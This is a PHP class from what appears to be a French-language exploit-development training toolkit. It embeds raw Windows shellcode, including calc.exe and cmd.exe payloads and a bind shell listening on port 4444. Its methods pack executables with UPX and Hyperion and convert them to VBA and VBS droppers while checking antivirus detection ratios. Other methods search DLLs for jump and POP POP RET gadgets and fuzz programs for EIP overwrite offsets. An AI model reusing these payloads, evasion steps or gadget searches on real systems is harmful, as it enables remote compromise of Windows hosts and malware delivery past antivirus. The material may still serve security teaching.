<?php


class bin4win extends bin{
	var $shellcode_calc_win7x86 ;
	var $shellcode_calc_xp3;
	var $shellcode_bind_4444_xp3;
	var $shellcode_cmd_win7x86;
	var $shellcode_calc_universal;

	
	/*
	 * find $esp,$esp+2000,0×90909090.
	 *
	 *
	 * remote@~$ gdbserver :2345 hello_world
	 * Process hello_world created; pid = 2509
	 * Listening on port 2345
	 *
	 * local@~$ gdb -q hello_world
	 * Reading symbols from /home/user/hello_world...done.
	 * (gdb) target remote 192.168.0.11:2345
	 * Remote debugging using 192.168.0.11:2345
	 * 0x002f3850 in ?? () from /lib/ld-linux.so.2
	 * (gdb) continue
	 * Continuing.
	 *
	 * Program received signal SIGSEGV, Segmentation fault.
	 * 0x08048414 in main () at hello_world.c:10
	 * 10 printf("x[%d] = %g\n", i, x[i]);
	 * (gdb)
	 *
	 * gdbserver --wrapper env LD_PRELOAD=libtest.so -- :2222 ./testprog
	 * net("https://sourceware.org/gdb/onlinedocs/gdb/Server.html");
	 *
	 */
	
	
	
	/*
	 *
	 * lscpu | grep bit
	 *
	 *
	 * On 32-bit machine: unsigned integer 4,294,967,295 + 1 = 0 (4,294,967,295 = 0xffffffff)
	 * On 64-bit machine: unsigned integer 18446744073709551615 + 1 = 0 (18446744073709551615 = 0xffffffffffffffff)
	 *
	 *
	 * od -tx1 portbinding_shellcode | cut -c8-80 | sed -e 's/ /\\x/g'
	 *
	 * nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'
	 *
	 *
	 * (gdb) info frame -> pour montrer l'etat de eip et ebp avant strcpy
	 *
	 *
	 * voir si la libc est include -> (gdb) info sources
	 * Source files for which symbols have been read in:
	 *
	 * /home/rohff/Bureau/CEH/cs/fmt_str_8.c, /usr/include/stdio.h,
	 * /usr/include/libio.h, /usr/include/i386-linux-gnu/bits/types.h,
	 * /usr/lib/gcc/i686-linux-gnu/4.6/include/stddef.h
	 *
	 *
	 * Virtual memory size: 2052096 -> (gdb) info proc stat
	 * ppid, uid, gid -> (gdb) info proc status
	 * info variables -- All global and static variable names
	 *
	 *
	 * mauvaises habitudes de programmation (i.e : strcpy ou gets)
	 * pas de contrôle de la taille de chaine à copier
	 *
	 *
	 * Le format Executable Linking Format (ELF):
	 * Le Program Loader (PL) crée une image processus à partir du fichier ELF executable
	 *
	 *
	 * http://users.nccs.gov/~fwang2/linux/lk_addressing.txt
	 * http://lldb.llvm.org/lldb-gdb.html
	 *
	 *
	 * voir le deroulement de ESP et EIP faire un break at strcpy line + info frame before and after strcpy
	 *
	 */
	
	// fuzzing
	// net("https://wiki.ubuntu.com/DebuggingProgramCrash");
	// net("https://wiki.ubuntu.com/Apport");
	/*
	 *
	 * apport-unpack /var/crash/_usr_bin_xdot.1000.crash ./tmp/rapport/
	 * /var/crash/executable_path.uid.crash.
	 *
	 * $ gdb -core=core --args $programme --some-options $options_programme
	 * (gdb)
	 * gdb -c core -q
	 * echo "core" > /proc/sys/kernel/core_pattern
	 * gdb set generate-core-file
	 * Collecte automatiquement des données et crée un rapport dans /var/crash
	 * Infos : Apport wiki, DebuggingProgramCrash, /usr/share/doc/apport, man apport-unpack
	 *
	 * Exemple de génération de rapport dans /tmp/rapport :
	 *
	 * # apport-unpack /var/crash/virtualbox-4.1.0.crash /tmp/rapport
	 * apport-retrace combines an Apport crash report (either a file or a Launchpad bug) and debug symbol (.ddebs packages) into fully symbolic stack traces. This can use a sandbox for installing debug symbol packages and doing the processing, so that entire process of retracing crashes can happen with normal user privileges without changing the system.
	 * Interfaces en mode texte
	 *
	 * gdbtui, ou : gdb --tui
	 * ou, dans gdb : Ctrl-x suivi de Ctrl-a.
	 * cgdb (source en couleur, par ncurses)
	 * existe en packages GNU/Linux et en exécutable Windows.
	 * net("http://nidirondel.free.fr/llibre/gdb.htm");
	 * requette("find // all executable");
	 * requette("ulimit -c unlimited"); // you'll find a file named "core" or "core.pid" in the current directory
	 * linux_prog_fuzzeling($programme);
	 * requette("gdb $programme core");
	 * requette("ls /var/crash");
	 *
	 *
	 * ddd ./tmp/buf_before core
	 * gdb -tui ./tmp/buf_before core
	 * tcpdump -dd -i eth0 -n: Dump packet-matching code as a C program fragment.
	 * rajouter valgrind dans tous les exos
	 */
	
	/*
	 function win_offset_eip($eip_val, $size) {
	 global $dir_tmp;
	 $tmp = req_ret ( "python $dir_tmp/pattern.py offset $eip_val $size" );
	 $win_offset_eip = $tmp [1];
	 unset ( $tmp );
	 article ( "Offset EIP", $win_offset_eip );
	 return $win_offset_eip;
	 }
	 function win_fuzz_prog_remote($vmx, $login, $password, $programme_path, $remote_fuzz_file_ext_path) {
	 global $dir_tmp;
	 
	 titre ( "Fuzzing:" );
	 $programme_name = trim ( basename ( $programme_path ) );
	 $vmx_name = trim ( basename ( $vmx ) );
	 $vmx_name = str_replace ( ".vmx", "", $vmx_name );
	 
	 for($overflow = 14;;) {
	 requette ( "echo \"r `python -c 'print\"A\"*$overflow'`\ni r  eip > $dir_tmp/gdb_cmd_fuzz_$programme_name" . "_$overflow" . ".txt" );
	 $file = "$dir_tmp/gdb_cmd_fuzz_$programme_name" . "_$overflow" . ".txt";
	 $dest = "C:\\\\tmp\\\\gdb_cmd_fuzz_$programme_name" . "_$overflow" . ".txt";
	 vm_upload ( $vmx_name, $file, $dest );
	 vm_exec_prog ( $vmx_name, "cmd.exe", $argv, $options );
	 
	 $check_fuzz = "gdb -q --batch -ex \"run `python -c 'print \"A\"*$overflow'` \"  -ex \"i r eip\" $programme_path | grep '41414141' ";
	 $tmp = req_ret ( $check_fuzz );
	 if (! empty ( $tmp [0] )) {
	 echo "\t\033[32;1mProvoquer le débordement overflow\033[0m -> send max data ( ici \033[33;1m$overflow\033[0m caracteres )\n";
	 requette ( "echo \"r `python -c 'print \"\\x41\"*4+\"\\x42\"*4+\"\\x43\"*4+\"\\x44\"*4+\"\\x51\"*($overflow-20)+\"\\x45\"*4'`\ni r\np/x *\\\$eax\np/x *\\\$ecx\np/x *\\\$edx\" > $dir_tmp/gdb_cmd_$programme_name" . "_$overflow" . ".txt" );
	 $file = "$dir_tmp/gdb_cmd_$programme_name" . "_$overflow" . ".txt";
	 $dest = $dest = "C:\\\\tmp\\\\gdb_cmd_$programme_name" . "_$overflow" . ".txt";
	 vm_upload ( $vmx_name, $file, $dest );
	 requette ( "gdb -q --batch -x $dir_tmp/gdb_cmd.txt $programme" );
	 return $overflow;
	 }
	 $overflow = $overflow + 128;
	 }
	 }
	 function win_find_offset_eip($vmx, $login, $password, $programme, $programme_path, $fuzz_add, $file_local, $path_remote_file, $ext_file) {
	 global $dir_tmp;
	 
	 // OK on Host
	 // XP: C:\> C:\tmp\tools\gdb.exe --batch -q -ex "run " --args "C:\Program Files\MoviePlay\MoviePlay.exe" "C:\tmp\evil.lst"
	 
	 // requette("vmrun -T ws -gu $login -gp $password runProgramInGuest $vmx cmd.exe \"/c cd \ && dir /s /b $programme > \\\"C:\\\\tmp\\\Locate.txt\\\" \" ");exit();
	 // $programme_path = "C:\\\Program\ Files\\\\$programme\\\\";
	 // $programme_path = "C:\Documents\ and\ Settings\XPSP3\Bureau\ROP_Win\CoolPlayer\ 2.18";
	 
	 $find = FALSE;
	 for($i = 4 + $fuzz_add; ! $find; $i = $i + $fuzz_add) {
	 win_pattern_create_file ( $vmx, $login, $password, $i, "$file_local" . "." . "$ext_file", "$path_remote_file" . "." . "$ext_file" );
	 // requette("vmrun -T ws -gu $login -gp $password runProgramInGuest $vmx cmd.exe \"/c C:\\\MinGW\\\\bin\\\\gdb.exe --batch -q -ex \\\"run \\\" --args \\\"$programme_path$programme\\\" \\\"$path_remote_file\\\" > \\\"C:\\\TP\\\Eip.txt\\\" \" ");
	 // OK
	 // requette("vmrun -T ws -gu $login -gp $password runProgramInGuest $vmx C:\TP\Gdb.exe --batch -q -ex \"run \" --args \"C:\TP\Coolplayer.exe\" \"C:\TP\Coolplayer.exe_fuzz_test.m3u\" > \"C:\TP\Eip.txt\" ");
	 requette ( "vmrun -T ws -gu $login -gp $password runProgramInGuest $vmx  \"C:/tmp/tools/gdb.exe\" \" --batch -q -ex \\\"run \\\"  --args \\\"$programme_path\\$programme\\\" \\\"C:\\\\tmp\\$programme" . "_fuzz_test.$ext_file\\\" > \\\"C:\\\\tmp\\\\eip.txt\\\" \" " );
	 
	 requette ( "vmrun -T ws -gu $login -gp $password copyFileFromGuestToHost $vmx C:/tmp/eip.txt $dir_tmp/eip.txt " );
	 $tmp_c = req_ret ( "cat $dir_tmp/eip.txt | grep 'SIGSEGV';echo " );
	 $check = trim ( $tmp_c [0] );
	 if (! empty ( $check )) {
	 $tmp = req_ret ( "cat $dir_tmp/eip.txt | grep -Po \"0x[0-9a-fA-F]{7,8}\" | grep -Po \"[0-9a-fA-F]{7,8}\" " );
	 $eip_val = $tmp [0];
	 unset ( $tmp );
	 $find = TRUE;
	 }
	 }
	 $win_offset_eip = win_offset_eip ( $eip_val, $i );
	 return $win_offset_eip;
	 }
	 function win_fuzz_file_create($programme_name, $fuzzing_size, $ext_file) {
	 global $dir_tmp, $dir_tools;
	 requette ( "python $dir_tools/bof/pattern.py create $fuzzing_size > $dir_tmp/fuzzing_" . $programme_name . "_" . $fuzzing_size . "." . $ext_file );
	 return "$dir_tmp/fuzzing_" . $programme_name . "_" . $fuzzing_size . "." . $ext_file;
	 }
	 function win_pattern_create_file($vmx, $login, $password, $fuzz, $file_local, $path_remote_file) {
	 global $dir_tmp;
	 requette ( "python $dir_tmp/pattern.py create $fuzz > $dir_tmp/$file_local" );
	 requette ( "vmrun -T ws -gu $login -gp $password copyFileFromHostToGuest $vmx $dir_tmp/$file_local \"$path_remote_file\" " );
	 }
	 */
	
	
	// backdoor_win_msf2c_win_shell_cmd($cmd, $badchars)
	/*
	 * -masm=dialect
	 * Output asm instructions using selected dialect. Supported choices are `intel' or `att' (the default one). Darwin does not support `intel'.
	 * asm("assembly code");
	 * __asm__ ("assembly code");
	 * nasmw -f win32 z.asm
	 */

	public function __construct($bin) {
	parent::__construct($bin);
	// OK - -b '\x00\xff\x0a\x0d' ratio 1/58
	$this->shellcode_calc_win7x86 = '\xda\xcd\xd9\x74\x24\xf4\xb8\x50\x99\x22\x39\x5b\x33\xc9\xb1\x31\x31\x43\x18\x83\xc3\x04\x03\x43\x44\x7b\xd7\xc5\x8c\xf9\x18\x36\x4c\x9e\x91\xd3\x7d\x9e\xc6\x90\x2d\x2e\x8c\xf5\xc1\xc5\xc0\xed\x52\xab\xcc\x02\xd3\x06\x2b\x2c\xe4\x3b\x0f\x2f\x66\x46\x5c\x8f\x57\x89\x91\xce\x90\xf4\x58\x82\x49\x72\xce\x33\xfe\xce\xd3\xb8\x4c\xde\x53\x5c\x04\xe1\x72\xf3\x1f\xb8\x54\xf5\xcc\xb0\xdc\xed\x11\xfc\x97\x86\xe1\x8a\x29\x4f\x38\x72\x85\xae\xf5\x81\xd7\xf7\x31\x7a\xa2\x01\x42\x07\xb5\xd5\x39\xd3\x30\xce\x99\x90\xe3\x2a\x18\x74\x75\xb8\x16\x31\xf1\xe6\x3a\xc4\xd6\x9c\x46\x4d\xd9\x72\xcf\x15\xfe\x56\x94\xce\x9f\xcf\x70\xa0\xa0\x10\xdb\x1d\x05\x5a\xf1\x4a\x34\x01\x9f\x8d\xca\x3f\xed\x8e\xd4\x3f\x41\xe7\xe5\xb4\x0e\x70\xfa\x1e\x6b\x8e\xb0\x03\xdd\x07\x1d\xd6\x5c\x4a\x9e\x0c\xa2\x73\x1d\xa5\x5a\x80\x3d\xcc\x5f\xcc\xf9\x3c\x2d\x5d\x6c\x43\x82\x5e\xa5\x20\x45\xcd\x25\x89\xe0\x75\xcf\xd5';
		// OK ratio 0/58
	//$this->shellcode_calc_win7x86 = '\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7';
		// OK ratio 0/58
	$this->shellcode_cmd_win7x86 = '\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6';
	
	
	// OK 144 bits calc.exe
	$this->shellcode_calc_xp3 = '\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca';
	$this->shellcode_bind_4444_xp3 = '\xda\xc5\xd9\x74\x24\xf4\x2b\xc9\xba\x3a\x04\xcc\xb6\x5e\xb1\x56\x31\x56\x19\x83\xee\xfc\x03\x56\x15\xd8\xf1\x30\x5e\x95\xfa\xc8\x9f\xc5\x73\x2d\xae\xd7\xe0\x25\x83\xe7\x63\x6b\x28\x8c\x26\x98\xbb\xe0\xee\xaf\x0c\x4e\xc9\x9e\x8d\x7f\xd5\x4d\x4d\x1e\xa9\x8f\x82\xc0\x90\x5f\xd7\x01\xd4\x82\x18\x53\x8d\xc9\x8b\x43\xba\x8c\x17\x62\x6c\x9b\x28\x1c\x09\x5c\xdc\x96\x10\x8d\x4d\xad\x5b\x35\xe5\xe9\x7b\x44\x2a\xea\x40\x0f\x47\xd8\x33\x8e\x81\x11\xbb\xa0\xed\xfd\x82\x0c\xe0\xfc\xc3\xab\x1b\x8b\x3f\xc8\xa6\x8b\xfb\xb2\x7c\x1e\x1e\x14\xf6\xb8\xfa\xa4\xdb\x5e\x88\xab\x90\x15\xd6\xaf\x27\xfa\x6c\xcb\xac\xfd\xa2\x5d\xf6\xd9\x66\x05\xac\x40\x3e\xe3\x03\x7d\x20\x4b\xfb\xdb\x2a\x7e\xe8\x5d\x71\x17\xdd\x53\x8a\xe7\x49\xe4\xf9\xd5\xd6\x5e\x96\x55\x9e\x78\x61\x99\xb5\x3c\xfd\x64\x36\x3c\xd7\xa2\x62\x6c\x4f\x02\x0b\xe7\x8f\xab\xde\xa7\xdf\x03\xb1\x07\xb0\xe3\x61\xef\xda\xeb\x5e\x0f\xe5\x21\xe9\x08\x2b\x11\xb9\xfe\x4e\xa5\x2f\xa2\xc7\x43\x25\x4a\x8e\xdc\xd2\xa8\xf5\xd4\x45\xd3\xdf\x48\xdd\x43\x57\x87\xd9\x6c\x68\x8d\x49\xc1\xc0\x46\x1a\x09\xd5\x77\x1d\x04\x7d\xf1\x25\xce\xf7\x6f\xe7\x6f\x07\xba\x9f\x0c\x9a\x21\x60\x5b\x87\xfd\x37\x0c\x79\xf4\xd2\xa0\x20\xae\xc0\x39\xb4\x89\x41\xe5\x05\x17\x4b\x68\x31\x33\x5b\xb4\xba\x7f\x0f\x68\xed\x29\xf9\xce\x47\x98\x53\x98\x34\x72\x34\x5d\x77\x45\x42\x62\x52\x33\xaa\xd2\x0b\x02\xd4\xda\xdb\x82\xad\x07\x7c\x6c\x64\x8c\x8c\x27\x25\xa4\x04\xee\xbf\xf5\x48\x11\x6a\x39\x75\x92\x9f\xc1\x82\x8a\xd5\xc4\xcf\x0c\x05\xb4\x40\xf9\x29\x6b\x60\x28\x23';
	
		
	}


	public function pe2raw() { // ne donne rien de concluant
	$this->requette("objdump -M Intel --section=.text  -d $this->file_path | tee $this->file_path.raw "); // --start-address=0x08048450 --stop-address=0x080484d4
	}
	

	public function win2info(){
	    $this->ssTitre(__FUNCTION__);
	    $this->file_file2virus4scan2local4clamav();$this->pause();	
	    $this->file_file2hash();$this->pause();
	    $this->file_file2info();$this->pause();
	    $this->file_file2metadata();$this->pause();
	    $this->file_file2strings(" | grep -E -i \"[[:print:]]{20,}\" ");$this->pause();
	    $this->file_file2strings(" | grep -E -i \"(Get|LoadLibrary|Create|Mutex|Crypt|Open|Virtual|Process|Reg|Token|Privileges)\" ");$this->pause();
	    $this->file_file2virus4scan2local4ssma();$this->pause();
	}
	
public function pe2debug(){
	$this->ssTitre(__FUNCTION__);
	$this->file_file2debug();
}

public function pe4exe2upx() {
	$this->ssTitre(__FUNCTION__);
	//$this->net("http://fr.wikipedia.org/wiki/UPX" );
	//$this->net("http://compression.ca/act/act-exepack.html" );
	$this->requette("upx --ultra-brute $this->file_path -o $this->file_dir/$this->file_name"."_upx.exe" );
	$check = new bin4win("$this->file_dir/$this->file_name"."_upx.exe"); // 38 / 57
	$check->file_file2virus2vt();
	$check->win2info();
	return "$this->file_dir/$this->file_name"."_upx.exe";
}



public function pe4exe2hyperion() {
	$this->ssTitre(__FUNCTION__);
	$file_exe_hyperion = str_replace(".exe", "_hyperion.exe", $this->file_ext );
	if (! file_exists("$this->file_dir/$file_exe_hyperion"))
	$this->requette("cd /opt/Hyperion-1.2; wine ./hyperion.exe $this->file_path $this->file_dir/$file_exe_hyperion" );
	$check = new file("$this->file_dir/$file_exe_hyperion");$check->file_file2virus2vt();
	return "$this->file_dir/$file_exe_hyperion";
}



public function pe2jmp4vm($rep_path, $reg, $vmx,$programme, $dll) {

	$vm_machine = new vm($vmx);
	$dll_name = trim ( basename ( $dll ) );
	/*
	 $vmx_name = trim ( basename ( $vmx ) );
	 $vmx_name = str_replace ( ".vmx", "", $vmx_name );
	 $vmem_name = trim ( basename ( $programme ) );
	 $programme_name = trim ( basename ( $programme ) );

	 */

	$dlls = $vm_machine->vm2download_dll_programme($rep_path,$programme, $dll );

	if ($dll == "all") {
	if (! file_exists ( "$rep_path/$programme.dll.all.$reg" )) {
	foreach ( $dlls as $dll_name ) {
	if (! file_exists ( "$rep_path/$dll_name.msfpescan.$reg" ))
	$this->requette ( "msfpescan -j $reg $rep_path/$programme.dll.$dll_name | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | tee $rep_path/$dll_name.msfpescan.$reg | wc -l " );
	if (! file_exists ( "$rep_path/$dll_name.ropper.$reg" ))
	$this->requette ( "ropper --jmp $reg --file $rep_path/$programme.dll.$dll_name | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | tee $rep_path/$dll_name.ropper.$reg |  wc -l " );
	$this->requette ( "cat $rep_path/$dll_name.msfpescan.$reg $rep_path/$dll_name.ropper.$reg | sort -u | tee $rep_path/$programme.dll.$dll_name.$reg | wc -l " );
	}
	$this->requette ( "cat $rep_path/$programme.dll.*.$reg | sort -u | tee $rep_path/$programme.dll.all.$reg | wc -l" );
	}
	} else {
	if (! file_exists ( "$rep_path/$dll_name.msfpescan.$reg" ))
	$this->requette ( "msfpescan -j $reg $rep_path/$programme.dll.$dll_name | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | tee $rep_path/$dll_name.msfpescan.$reg | wc -l " );
	if (! file_exists ( "$rep_path/$dll_name.ropper.$reg" ))
	$this->requette ( "ropper --jmp $reg --file $rep_path/$programme.dll.$dll_name | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | grep -v -E \"(00\$|20\$|0a\$)\" | tee $rep_path/$dll_name.ropper.$reg |  wc -l " );
	$this->requette ( "cat $rep_path/$dll_name.msfpescan.$reg $rep_path/$dll_name.ropper.$reg | sort -u | tee $rep_path/$programme.dll.$dll_name.$reg | wc -l " );
	}
	$this->requette ( "cat $rep_path/$programme.dll.$dll.$reg | wc -l" );
	$this->requette ( "gedit $rep_path/$programme.dll.$dll.$reg" );
	$this->remarque ( "enlever des $reg dans ce fichier si vous voulez juste qlq exemples" );
	return file ( "$rep_path/$programme.dll.$dll.$reg" );
}


public function pe2offset4eip_win2() {
	$this->titre("Find Offset windows");
	$tmp = trim($this->req_ret_str("cat $this->file_rep/ssh_ret.cmd | tail -1 | cut -d'x' -f3 | grep -Po \"[0-9a-fA-F]{7,8}\""));
	$tmp2 = trim($this->req_ret_str("python $this->file_rep/pattern.py offset $tmp | tail -1 "));
	$this->article("Offset", $tmp2);
	return $tmp2;
}



public function pe4exe2vba() {
	$this->ssTitre(__FUNCTION__);
	if (! file_exists("$file_exe.vba" ))
	$this->requette("ruby /opt/metasploit/apps/pro/msf3/tools/exe2vba.rb $this->file_path $this->file_path.vba" );
	$check = new file("$this->file_path.vba");$check->file_file2virus2vt();
	return "$file_exe.vba";
}


public function pe4exe() {
	$this->ssTitre(__FUNCTION__);

}

public function pe4exe2vbs() {
	$this->ssTitre(__FUNCTION__);
	$file_exe_name = str_replace(".exe", "", $this->file_ext );
	// net("https://github.com/dnet/base64-vbs.py");
	$this->requette("cd $this->dir_tools/backdoor/; python ./b64vbs.py $this->file_path $this->file_dir/$file_exe_name" . "2vbs.vbs" );
	$check = new file("$this->file_dir/$file_exe_name" . "2vbs.vbs");$check->file_file2virus2vt();
	return "$this->file_dir/$file_exe_name" . "2vbs.vbs";
}



public function pe4pop2ret4bin($bin) {
	$this->gtitre("searching All POP POP RET  ");
	$bin = trim($bin);
	$pop2ret_bin = array();
	$file_pop2ret_output = "$bin.pop2ret.addr.all";
	if (file_exists($file_pop2ret_output)) return file($file_pop2ret_output);

	$this->requette("ropper --ppr --file $bin | grep pop  | grep -Po -i \"0x[0-9a-f]{1,}\" | tee $bin.ropper.pop2ret | wc -l  ");
	$this->requette("msfpescan --poppopret $bin | grep -Po -i \"0x[0-9a-f]{1,}\" | tee $bin.msfpescan.pop2ret | wc -l ");
	$this->requette("cat $bin.ropper.pop2ret $bin.msfpescan.pop2ret  | sort -u > $bin.pop2ret.addr.tmp "); // | grep -v -E \"(00\$|20\$|0a\$)\"  | grep -v -E \"(^0x00|^0x20|^0x0a)\"


	$tmp = file("$bin.pop2ret.addr.tmp");
	$tmp = array_map("trim",$tmp);
	if (!empty($tmp)){
		//$tmp = array_map($this->hex2norme_32,$tmp);
		for($i=0;$i<=count($tmp);$i++) if(!empty($tmp[$i])) {$tmp[$i]=$this->hex2norme_32($tmp[$i]);$pop2ret_bin[] = $tmp[$i];}
		unset($tmp);
	}
	$pop2ret_bin = array_unique($pop2ret_bin);
	array_multisort($pop2ret_bin);

	$this->article("POP POP RET 4 $bin ", count($pop2ret_bin));
	//$this->tab($pop2ret_bin);

	$file_pop = fopen($file_pop2ret_output,"w");
	foreach ($pop2ret_bin as $pop)
		fwrite($file_pop, "$pop\n");

		fclose($file_pop);

		//$this->requette("gedit $file_pop2ret_output");
		return file($file_pop2ret_output);
}
















}
?>